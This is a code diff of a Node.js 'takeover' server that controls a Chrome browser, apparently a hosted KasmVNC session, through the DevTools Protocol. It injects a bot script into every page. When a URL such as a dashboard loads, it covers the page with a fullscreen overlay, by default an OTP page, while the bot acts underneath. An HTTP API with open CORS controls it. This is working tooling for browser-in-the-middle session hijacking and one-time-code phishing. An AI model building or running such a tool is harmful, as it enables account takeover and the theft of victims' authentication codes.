@@ -1,21 +1,50 @@
 const CDP = require('chrome-remote-interface');
 const express = require('express');
+const https = require("https");
+const fs = require("fs");
 
 const app = express();
 app.use(express.json());
-app.use("/pages", express.static("/usr/local/share/takeover-pages"));
+app.use("/pages", express.static("/usr/local/share/kasmvnc/www/pages"));
 
-let takeoverEnabled = false;
-let targetKeyword = "dashboard";
-let overlayPage = "otp.html";
+const certDir = "/usr/local/share/takeover-certs";
 
-let cdpClient = null;
+https.createServer({
+  key: fs.readFileSync(`${certDir}/key.pem`),
+  cert: fs.readFileSync(`${certDir}/cert.pem`)
+}, app).listen(4000, "0.0.0.0", () => {
+  console.log("[takeover] HTTPS server running on 4000");
+});
 
 /* ===============================
-   Connexion CDP avec retry
+   STATE
+=================================*/
+
+let takeoverArmed = false;
+let targetKeyword = "dashboard";
+let overlayPage = "otp.html";
+let cdpClient = null;
+let takeoverEnabled = false;
+/* ===============================
+   HEADERS
+=================================*/
+
+app.use((req, res, next) => {
+  res.setHeader("Access-Control-Allow-Origin", "*");
+  res.setHeader("Access-Control-Allow-Methods", "GET,POST");
+  res.setHeader("Cross-Origin-Resource-Policy", "cross-origin");
+  res.setHeader("Cross-Origin-Opener-Policy", "unsafe-none");
+  res.setHeader("Cross-Origin-Embedder-Policy", "unsafe-none");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+  next();
+});
+
+/* ===============================
+   CDP CONNECTION
 =================================*/
 
 async function connectWithRetry(retries = 30, delay = 1000) {
+  // Chrome may not be ready yet; retry until CDP becomes available.
   for (let i = 0; i < retries; i++) {
     try {
       const client = await CDP({ host: '127.0.0.1', port: 9222 });
@@ -26,105 +55,136 @@ async function connectWithRetry(retries = 30, delay = 1000) {
       await new Promise(res => setTimeout(res, delay));
     }
   }
-  throw new Error("Chrome CDP not available after retries");
+  throw new Error("Chrome CDP not available");
 }
 
+/* ===============================
+   INIT CDP
+=================================*/
+
 async function initCDP() {
+  console.log("[takeover] initCDP");
+
+  // Keep CDP client in shared state for later Runtime calls.
   cdpClient = await connectWithRetry();
 
-  const { Page, Network } = cdpClient;
+  const { Page, Network, Runtime } = cdpClient;
 
   await Page.enable();
   await Network.enable();
+  await Runtime.enable();
 
-  console.log("[takeover] CDP ready");
+  /* ===============================
+     CONSOLE LOG FROM BROWSER
+  =================================*/
+
+  Runtime.consoleAPICalled((event) => {
+    const args = event.args.map(arg =>
+      arg.value ?? arg.description ?? arg.unserializableValue ?? "[?]"
+    );
+    console.log("[BROWSER]", ...args);
+  });
+
+  /* ===============================
+     CDP BINDING 
+  =================================*/
+
+  await Runtime.addBinding({
+    name: "takeoverSend"
+  });
+
+  Runtime.bindingCalled(({ name, payload }) => {
+    if (name !== "takeoverSend") return;
+
+    try {
+      // Receives messages emitted from the injected browser script.
+      const cmd = JSON.parse(payload);
+
+      console.log("[takeover] binding cmd:", cmd);
+
+    } catch (e) {
+      console.error("[takeover] binding error:", e);
+    }
+  });
+
+  /* ===============================
+     INJECTION 
+  =================================*/
+
+  const botPath = "/usr/local/bin/bot.js";
+
+  if (!fs.existsSync(botPath)) {
+    console.error("[takeover] bot.js not found");
+  } else {
+    const botScript = fs.readFileSync(botPath, "utf8");
+
+    await Page.addScriptToEvaluateOnNewDocument({
+      source: `
+        (() => {
+          try {
+            // Inject only in top-level document, not in iframes.
+            if (window.top !== window) return;
+
+            // Bridge from page context to Node via CDP binding.
+            window.takeover = {
+              send: (data) => {
+                window.takeoverSend(JSON.stringify(data));
+              }
+            };
+
+            ${botScript}
+
+          } catch (e) {
+            console.error("[bot preload error]", e);
+          }
+        })();
+      `
+    });
+
+    console.log("[takeover] bot + bridge injected");
+  }
+
+  /* ===============================
+     URL TRIGGER
+  =================================*/
 
   const checkUrl = (url) => {
-    if (!takeoverEnabled) return;
-    if (url.includes(targetKeyword)) {
-      console.log("🚀 TAKEOVER TRIGGERED:", url);
+    // Trigger takeover only when armed and keyword matches URL.
+    if (!takeoverArmed || takeoverEnabled) return;
+
+    if (targetKeyword && url.includes(targetKeyword)) {
+      console.log("TAKEOVER TRIGGERED:", url);
       runBotAction();
     }
   };
 
   Page.frameNavigated((event) => {
-    if (event.frame && event.frame.url) {
-      checkUrl(event.frame.url);
-    }
+    if (!event.frame || event.frame.parentId) return;
+
+    const url = event.frame.url;
+    console.log("[takeover] main frame:", url);
+
+    checkUrl(url);
   });
 
+  console.log("[takeover] CDP ready");
 }
-console.log("TAKEOVER SERVER LISTENING");
+
 /* ===============================
-   OVERLAY MANAGEMENT
+   OVERLAY
 =================================*/
-async function removeOverlay() {
-  if (!cdpClient) return;
 
-  const { Runtime } = cdpClient;
-
-  console.log("[takeover] Removing overlay");
-
-  await Runtime.evaluate({
-    expression: `
-      (function() {
-        const el = document.getElementById("takeover-overlay");
-        if (el) {
-          el.remove();
-        }
-      })();
-    `
-  });
-
-  console.log("[takeover] Overlay removed");
+function removeOverlay() {
+  // Frontend polls /state and hides overlay when disabled.
+  takeoverEnabled = false;
 }
 
-async function injectOverlay() {
-  if (!cdpClient) return;
+function injectOverlay(page) {
+  // Default page shown while bot takeover initializes.
+  if (!page) page = "loading.html";
 
-  const { Page, Runtime } = cdpClient;
-
-  console.log("[takeover] Injecting fullscreen overlay (isolated world)");
-
-  // 1️⃣ Récupérer le main frame
-  const { frameTree } = await Page.getFrameTree();
-  const mainFrameId = frameTree.frame.id;
-
-  console.log("[takeover] Main frame ID:", mainFrameId);
-
-  // 2️⃣ Créer un contexte d’exécution isolé dans le main frame
-  const { executionContextId } = await Page.createIsolatedWorld({
-    frameId: mainFrameId,
-    worldName: "takeover-world"
-  });
-
-  console.log("[takeover] Execution context ID:", executionContextId);
-
-  // 3️⃣ Injecter l’overlay dans CE contexte
-  await Runtime.evaluate({
-    expression: `
-      (function() {
-        if (document.getElementById("takeover-overlay")) return;
-
-        const iframe = document.createElement("iframe");
-        iframe.id = "takeover-overlay";
-        iframe.src = "http://127.0.0.1:4000/pages/" + "${overlayPage}";
-
-        iframe.style.position = "fixed";
-        iframe.style.top = "0";
-        iframe.style.left = "0";
-        iframe.style.width = "100vw";
-        iframe.style.height = "100vh";
-        iframe.style.border = "none";
-        iframe.style.zIndex = "999999999";
-
-        document.body.appendChild(iframe);
-      })();
-    `,
-    contextId: executionContextId
-  });
-
-  console.log("[takeover] Overlay injected in isolated world");
+  takeoverEnabled = true;
+  overlayPage = page;
 }
 
 /* ===============================
@@ -132,100 +192,83 @@ async function injectOverlay() {
 =================================*/
 
 async function runBotAction() {
-  if (!cdpClient) return;
+  console.log("[takeover] runBotAction");
 
   try {
+    // Enable overlay immediately to provide user feedback.
+    takeoverEnabled = true;
+
     const { Runtime } = cdpClient;
 
-    // 1️⃣ Inject overlay visible pour l'utilisateur
-    await injectOverlay();
-    console.log("[bot] Overlay active, bot continues underneath");
-
-    // 2️⃣ BOT ACTION DOM-BASED
     await Runtime.evaluate({
       expression: `
-        (function() {
-          const input = document.querySelector('input[name="urname"]');
-          if (!input) {
-            console.log("[bot] Input not found");
-            return;
-          }
-
-          console.log("[bot] Input found");
-
-          // Focus + click
-          input.focus();
-          input.click();
-
-          // Clear existing value
-          input.value = "";
-
-          // Type "test"
-          input.value = "bot fonctionne";
-
-          // Trigger events (important si validation JS)
-          input.dispatchEvent(new Event("input", { bubbles: true }));
-          input.dispatchEvent(new Event("change", { bubbles: true }));
-
-          console.log("[bot] Text injected");
-        })();
+        // Prevent duplicate activation in same browser session.
+        if (!sessionStorage.getItem("__BOT_ACTIVE__")) {
+          sessionStorage.setItem("__BOT_ACTIVE__", "true");
+          window.__BOT_ACTIVE__ = true;
+          console.log("[bot] Activated");
+        }
       `
     });
 
+    injectOverlay();
+
   } catch (err) {
-    console.error("[bot] Error:", err);
+    console.error("[takeover] runBotAction error:", err);
   }
 }
 
-
 /* ===============================
-   API CONTROL RUNTIME
+   API
 =================================*/
 
 app.post("/takeover", async (req, res) => {
   try {
     const { enabled, keyword, page } = req.body;
 
-    console.log("[takeover] API called with body:", req.body);
-
-    takeoverEnabled = Boolean(enabled);
-
-    if (typeof keyword === "string" && keyword.trim() !== "") {
-      targetKeyword = keyword.trim();
-    } else {
-      targetKeyword = null;
-    }
-
     if (typeof page === "string" && page.trim() !== "") {
       overlayPage = page.trim();
     }
 
-    console.log(
-      `[takeover] enabled=${takeoverEnabled} keyword=${targetKeyword} page=${overlayPage}`
-    );
+    if (typeof keyword === "string" && keyword.trim() !== "") {
+      // Armed mode: wait for URL match before executing bot action.
+      targetKeyword = keyword.trim();
+      takeoverArmed = true;
+      takeoverEnabled = false;
+    } else {
+      // Direct mode: toggle overlay state immediately.
+      targetKeyword = null;
+      takeoverArmed = false;
+      takeoverEnabled = Boolean(enabled);
+    }
 
-    if (!takeoverEnabled) {
-      await removeOverlay();
+    if (!takeoverEnabled && !takeoverArmed) {
+      removeOverlay();
     }
 
     return res.json({
       status: "ok",
+      armed: takeoverArmed,
       enabled: takeoverEnabled,
       keyword: targetKeyword,
       page: overlayPage
     });
 
   } catch (err) {
-    console.error("[takeover] API error:", err);
-    return res.status(500).json({ status: "error", error: err.message });
+    return res.status(500).json({ error: err.message });
   }
 });
 
-app.listen(4000, "0.0.0.0", () => {
-  console.log("[takeover] API listening on 0.0.0.0:4000");
+app.get("/state", (req, res) => {
+  res.json({
+    enabled: takeoverEnabled,
+    page: overlayPage
+  });
 });
 
-/* =============================== */
+/* ===============================
+   START
+=================================*/
 
 initCDP().catch(err => {
   console.error("[takeover] Fatal CDP error:", err);
